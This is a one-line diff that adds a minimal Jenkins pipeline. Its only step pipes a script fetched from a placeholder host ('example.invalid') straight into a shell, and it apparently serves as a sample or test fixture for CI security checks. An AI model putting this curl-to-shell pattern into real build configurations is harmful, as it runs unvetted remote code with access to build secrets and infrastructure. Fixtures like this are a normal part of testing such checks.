@@ -1,0 +1,1 @@
+pipeline { stages { stage('x') { steps { sh 'curl http://example.invalid/install.sh | sh' } } } }
